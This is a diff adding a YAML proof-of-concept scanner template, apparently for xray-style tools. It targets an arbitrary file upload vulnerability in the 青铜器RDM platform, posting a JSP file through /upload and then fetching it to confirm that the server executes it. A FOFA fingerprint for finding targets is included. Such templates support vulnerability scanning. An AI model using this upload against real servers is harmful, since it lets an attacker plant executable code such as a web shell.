@@ -1,0 +1,41 @@
+id: poc-yaml-cnrdm-upload-upload
+info:
+  name: 青铜器RDM研发管理平台 /upload 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 青铜器RDM
+  fofa: body="/images/rdm.ico"
+variables:
+  t1: random_int(111000,999000)
+requests:
+- method: POST
+  path: /upload?dir=cmVwb3NpdG9yeQ==&name=dGVzdC5qc3A=&start=0&size=7000
+  headers:
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+  data: '--00content0boundary00
+
+    Content-Disposition: form-data; name="file"; filename="poc.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <%out.println("hello{{.t1}}");%>
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="Submit"
+
+
+    Go
+
+    --00content0boundary00--
+
+    '
+  output:
+  - regex_match(body,"(?P<path>.*?)test.jsp")
+  expression: "status_code == 200 && \ncontains(body,\"test.jsp\")\n"
+- method: GET
+  path: /repository{{.path}}test.jsp
+  expression: "status_code == 200 && \ntrim(body) == \"hello\" + t1\n"
+transport: http
